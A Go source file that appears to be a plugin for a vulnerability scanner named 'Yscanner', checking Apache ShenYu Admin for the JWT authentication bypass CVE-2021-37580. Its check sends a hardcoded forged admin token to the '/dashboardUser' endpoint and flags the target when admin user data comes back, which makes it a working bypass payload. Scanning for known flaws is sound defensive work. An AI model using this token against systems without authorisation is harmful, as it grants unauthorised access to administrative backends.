package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("shenyu_cve_2021_37580", &shenyu_cve_2021_37580{})
}

type shenyu_cve_2021_37580 struct{}

func (p *shenyu_cve_2021_37580) Info() PluginInfo {
	return PluginInfo{
		Name:     "Apache ShenYu Admin JWT认证绕过漏洞（CVE-2021-37580）",
		VulnInfo: "Apache ShenYu 是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。Apache ShenYu Admin 2.3.0 及 2.4.0 版本中存在身份验证绕过漏洞，攻击者可通过该漏洞绕过JSON Web Token (JWT)安全认证，直接进入系统后台",
		VulnID:   "CVE-2021-37580",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "2.3.0 <= Apache ShenYu <= 2.4.0",
		CWE:      "CWE-287	认证机制不恰当",
	}
}

func (p *shenyu_cve_2021_37580) Check(netloc string) bool {
	req, err := http.NewRequest("GET", netloc+"/dashboardUser", nil)
	if err != nil {
		return false
	}
	req.Header.Set("X-Access-Token", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "query success") &&
		strings.Contains(resp.ResponseRaw, "admin") {
		return true
	}
	return false
}
